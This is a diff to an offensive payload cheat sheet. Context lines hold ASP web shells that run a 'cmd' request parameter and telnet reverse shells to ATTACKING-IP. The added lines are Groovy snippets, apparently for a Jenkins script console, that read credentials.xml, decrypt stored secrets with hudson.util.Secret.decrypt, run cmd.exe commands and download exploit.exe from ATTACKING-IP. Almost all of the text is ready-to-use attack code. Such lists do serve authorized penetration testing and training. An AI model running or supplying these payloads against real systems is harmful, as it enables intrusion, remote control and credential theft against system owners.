@@ -13,6 +13,7 @@ ASP:
 <% eval request("cmd") %>
 <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
 
+---------------------------------------------------------------------------------------------------------------------------------------
 
 # Reverse Shells:
 
@@ -78,4 +79,17 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 443 0/tmp/p
 (or)
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 
+---------------------------------------------------------------------------------------------------------------------------------------
+
+# Groovy:
+
+Extract Credentials:
+def sout = new StringBuffer(), serr = new StringBuffer();def proc = 'cmd.exe /c type credentials.xml'.execute();proc.consumeProcessOutput(sout, serr);proc.waitForOrKill(1000);println "out> $sout err> $serr"
+hashed_pw='<password_hash>';passwd = hudson.util.Secret.decrypt(hashed_pw);println(passwd)
+
+Command Execution:
+def sout = new StringBuffer(), serr = new StringBuffer();def proc = 'cmd.exe /c dir C:\\'.execute();proc.consumeProcessOutput(sout, serr);proc.waitForOrKill(1000);println "out> $sout err> $serr"
+
+Remote File Download:
+def url = 'http://ATTACKING-IP/exploit.exe';def file = new File('exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
 
